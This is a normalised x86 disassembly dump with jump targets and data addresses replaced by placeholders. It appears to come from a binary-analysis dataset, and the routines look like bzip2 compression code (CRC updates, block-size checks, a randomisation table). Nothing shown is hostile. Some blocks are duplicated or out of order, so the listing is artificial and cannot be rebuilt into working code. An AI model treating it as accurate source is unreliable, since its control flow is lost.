push 0x36ee80
push [ edi + 0x2c ]
call [ edi + 0x24 ]
push 0x1
mov [ esi + 0x10 ] eax
push 0x36ef08
push [ edi + 0x2c ]
call [ edi + 0x24 ]
push 0x1
mov [ esi + 0x14 ] eax
push 0x40004
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov ecx [ esi + 0x10 ]
add esp 0x24
mov [ esi + 0x18 ] eax
cmp ecx ebx
je r-xdata
push 0xfffffffd
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x14 ]
cmp edx ebx
je r-xdata
pop eax
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
cmp ecx ebx
je r-xdata
cmp eax ebx
je r-xdata
push esi
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
jmp r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
push ecx
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
mov [ esi + 0x26c ] ebx
mov [ esi + 0x264 ] ebx
mov [ esi + 0x270 ] 0x9
mov [ esi + 0x48 ] 0xdbb8d
mov [ esi + 0x268 ] ebx
mov [ esi + 0x30 ] 0x1e
mov [ esi + 0x24 ] edx
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x20 ] ecx
push 0x2
pop eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ edi + 0x20 ] esi
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x18 ] ebx
mov [ edi + 0x1c ] ebx
mov [ esi + 0x34 ] 0x100
mov [ esi + 0x38 ] ebx
call sub_10014410
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_10014583
mov cl [ eax + 0x34 ]
push esi
xor esi esi
cmp [ eax + 0x38 ] esi
push edi
jle r-xdata
mov edx [ eax + 0x34 ]
mov [ eax + edx + 0x58 ] 0x1
mov edx [ eax + 0x38 ]
mov esi edx
dec esi
je r-xdata
movzx edi cl
push ebx
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
dec esi
je r-xdata
mov edx [ eax + 0x260 ]
mov ebx edx
shr ebx 0x18
xor ebx edi
shl edx 0x8
xor edx [ ebx * 4 + rw-data ]
inc esi
mov [ eax + 0x260 ] edx
cmp esi [ eax + 0x38 ]
jl r-xdata
pop ebx
mov edi [ eax + 0x24 ]
lea edx [ eax + 0x44 ]
mov esi [ edx ]
mov [ esi + edi ] cl
inc [ edx ]
mov esi [ edx ]
mov eax [ eax + 0x24 ]
mov [ esi + eax ] cl
inc [ edx ]
jmp r-xdata
dec esi
je r-xdata
pop edi
pop esi
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
jmp r-xdata
mov [ edx + eax + 0x54 ] 0x1
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov dl [ eax + 0x38 ]
mov ecx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
sub dl 0x4
mov [ ecx + esi ] dl
jmp r-xdata
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
sub_1001465f
push ebp
mov ebp esp
push ecx
push ecx
cmp [ esi + 0x4 ] 0x2
mov eax [ esi + 0x44 ]
push ebx
push edi
mov [ ebp - 0x1 ] 0x0
jne r-xdata
cmp eax [ esi + 0x48 ]
jl r-xdata
jmp r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_10014583
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_10014583
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ esi + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
sub_100147fb
push ecx
push ebx
push ebp
push esi
mov esi [ eax + 0x20 ]
xor ebx ebx
push edi
mov [ esp + 0x12 ] bl
mov [ esp + 0x13 ] bl
cmp [ esi + 0x8 ] 0x2
jne r-xdata
xor cl cl
jmp r-xdata
xor edi edi
inc edi
cmp [ esi + 0x8 ] edi
jne r-xdata
call sub_1001465f
or [ esp + 0x12 ] al
cmp [ esi + 0x4 ] 0x2
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ esi + 0x44 ]
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jge r-xdata
mov eax [ esi + 0x50 ]
or [ esp + 0x13 ] cl
cmp eax [ esi + 0x4c ]
jl r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
push ebx
mov ebp 0x100
cmp [ esi + 0x34 ] ebp
jae r-xdata
mov edx [ esi + 0x2c ]
mov al [ eax + edx ]
mov ebp [ esi ]
mov ebp [ ebp + 0x10 ]
mov [ ebp ] al
mov eax [ esi ]
inc [ esi + 0x50 ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
mov cl 0x1
cmp [ eax + 0x18 ] ebx
jne r-xdata
cmp [ esp + 0x12 ] bl
jne r-xdata
cmp [ esi + 0x4 ] 0x4
jne r-xdata
cmp [ esi + 0x4 ] 0x4
mov [ esi + 0x34 ] ebp
sete al
movzx eax al
mov [ esi + 0x38 ] ebx
push eax
jmp r-xdata
mov eax esi
call sub_10014583
inc [ eax + 0x1c ]
mov eax edi
cmp [ esp + 0x13 ] bl
jne r-xdata
call sub_10014410
cmp [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] 0x2
jne r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax esi
call sub_10017335
pop ecx
mov [ esi + 0x8 ] edi
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
mov eax esi
call sub_1001443b
test al al
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax esi
call sub_1001443b
test al al
jne r-xdata
sub_10014922
push esi
test eax eax
jne r-xdata
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
mov edx [ esi ]
cmp edx eax
jne r-xdata
mov ecx [ esi + 0x4 ]
dec ecx
je r-xdata
or eax 0xffffffff
pop esi
retn
dec ecx
jne r-xdata
dec ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x4 ] 0x4
jmp r-xdata
dec ecx
je r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
retn
call sub_100147fb
test al al
je r-xdata
cmp [ esi + 0xc ] 0x0
ja r-xdata
push 0x3
jmp r-xdata
mov eax esi
call sub_1001443b
test al al
je r-xdata
pop eax
pop esi
retn
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jl r-xdata
mov [ esi + 0x4 ] 0x1
push 0x4
jmp r-xdata
sub_10014999
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop edi
retn
cmp [ edi ] esi
je r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0x18 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
pop edi
retn
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_100149f5
push ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ esi + 0x24 ] ebx
jne r-xdata
push 0xfffffffe
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x24 ] sub_100143ed
push 0x1
push 0xfa74
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
cmp eax ebx
jne r-xdata
mov [ esi + 0x28 ] sub_100143fe
mov [ eax ] esi
mov [ esi + 0x20 ] eax
mov [ eax + 0x20 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0xc64 ] ebx
mov [ eax + 0x4 ] 0xa
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ eax + 0x28 ] bl
mov [ eax + 0xc54 ] ebx
mov [ eax + 0xc50 ] ebx
mov [ eax + 0xc4c ] ebx
mov [ eax + 0x2c ] ebx
mov [ eax + 0x30 ] ebx
xor eax eax
pop ebx
retn
push 0xfffffffd
jmp r-xdata
pop eax
pop ebx
retn
sub_10014a74
push ebp
mov ebp esp
sub esp 0x28
cmp [ ecx + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax [ ecx + 0xc60 ]
mov ebx [ ecx + 0xc4c ]
mov esi [ ecx + 0xc ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov al [ ecx + 0x8 ]
mov [ ebp - 0x1 ] al
mov eax [ ecx + 0x440 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ecx ]
mov edi [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x18 ] edi
mov edi [ ecx + 0x24 ]
mov [ ebp - 0x24 ] edi
mov edi [ ecx + 0xfa40 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] eax
inc edi
mov edx [ ecx ]
xor edi edi
cmp [ edx + 0x14 ] edi
je r-xdata
cmp [ ebp - 0x8 ] edi
jg r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ecx + 0xc ] edi
je r-xdata
mov al 0x1
je r-xdata
mov eax [ ecx ]
mov edi [ eax + 0x18 ]
mov [ ebp - 0x24 ] edi
sub edi [ ebp - 0x10 ]
add edi [ ebp - 0x28 ]
mov [ eax + 0x18 ] edi
mov eax [ ecx ]
mov edi [ ebp - 0x24 ]
cmp [ eax + 0x18 ] edi
jae r-xdata
cmp esi 0x1
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx + 0xfa40 ]
mov esi [ ecx + 0x440 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp esi eax
je r-xdata
mov eax [ edx + 0x10 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
movzx ebx [ ecx + 0x8 ]
lea esi [ ecx + 0xc60 ]
mov edx [ esi ]
mov eax edx
shl edx 0x8
shr eax 0x18
xor eax ebx
xor edx [ eax * 4 + rw-data ]
dec [ ecx + 0xc ]
mov [ esi ] edx
mov edx [ ecx ]
inc [ edx + 0x10 ]
mov edx [ ecx ]
dec [ edx + 0x14 ]
mov edx [ ecx ]
inc [ edx + 0x18 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] edi
jne r-xdata
xor esi esi
jmp r-xdata
mov al [ ebp - 0xc ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x14 ]
mov [ ecx + 0xc60 ] eax
mov al [ ebp - 0x1 ]
mov [ ecx + 0x8 ] al
mov eax [ ebp - 0x8 ]
mov [ ecx + 0x440 ] eax
mov eax [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
mov eax [ ecx ]
mov [ ecx + 0x38 ] edx
mov edx [ ebp - 0x18 ]
mov [ ecx + 0xc ] esi
mov [ ecx + 0xc4c ] ebx
mov [ eax + 0x10 ] edx
mov eax [ ecx ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x14 ] ecx
inc [ eax + 0x1c ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ ebx ] al
mov ebx [ ebp - 0x14 ]
movzx eax al
shr ebx 0x18
xor ebx eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
dec esi
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jg r-xdata
inc [ edx + 0x1c ]
jmp r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx eax al
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] eax
je r-xdata
xor esi esi
inc esi
mov esi [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ esi ] al
mov esi [ ebp - 0x14 ]
movzx eax al
shr esi 0x18
xor esi eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ esi * 4 + rw-data ]
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov al [ ecx + 0x3c ]
mov edx [ ecx + 0x38 ]
mov [ ecx + 0x8 ] al
mov eax [ ecx + 0x24 ]
imul eax eax 0x186a0
mov [ ecx + 0xc ] 0x1
mov [ ebp - 0x1c ] eax
cmp edx eax
jae r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ebx [ ecx + 0xc4c ]
mov edx [ ebx + edx * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
cmp [ ecx + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
push 0x2
pop esi
mov [ ebp - 0x20 ] eax
cmp edx eax
jae r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
test esi esi
jle r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x2
cmp eax [ ebp - 0x1c ]
jae r-xdata
push 0x3
pop esi
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov ebx [ ebp - 0x1c ]
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x3
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx esi al
shr edx 0x8
add esi 0x4
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov edx [ ebx + edx * 4 ]
movzx eax dl
shr edx 0x8
add [ ebp - 0x8 ] 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
je r-xdata
and [ ecx + 0x18 ] 0x0
mov eax [ ecx + 0x38 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
xor edx edx
inc esi
cmp edi 0x1
sete dl
movzx eax al
mov [ ecx + 0x440 ] esi
xor edx eax
add edx 0x4
mov [ ecx + 0xc ] edx
mov edx [ ecx + 0x38 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov eax [ ebx + edx * 4 ]
mov [ ecx + 0x38 ] eax
shr [ ecx + 0x38 ] 0x8
movzx eax al
mov [ ecx + 0x3c ] eax
test edi edi
jne r-xdata
and [ ecx + 0x18 ] 0x0
dec [ ecx + 0x14 ]
mov eax [ ecx + 0x14 ]
xor edx edx
cmp eax 0x1
sete dl
xor [ ecx + 0x3c ] edx
inc esi
mov [ ecx + 0x440 ] esi
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov edx [ eax * 4 + rw-data ]
inc eax
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] eax
cmp eax 0x200
jne r-xdata
and [ ecx + 0x18 ] edi
sub_10014f20
push esi
xor eax eax
mov edx 0x100
push edi
mov edx ecx
mov eax ecx
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ esp + 0x10 ]
lea ecx [ edx + eax ]
sar ecx 0x1
cmp esi [ edi + ecx * 4 ]
jl r-xdata
pop edi
pop esi
retn
mov ecx edx
sub ecx eax
cmp ecx 0x1
jne r-xdata
sub_10014f4d
push ebp
mov ebp esp
sub esp 0x10
cmp [ esi + 0x10 ] 0x0
push ebx
push edi
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
xor al al
jmp r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
mov al 0x1
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x440 ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ esi + 0x440 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_10014f20
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
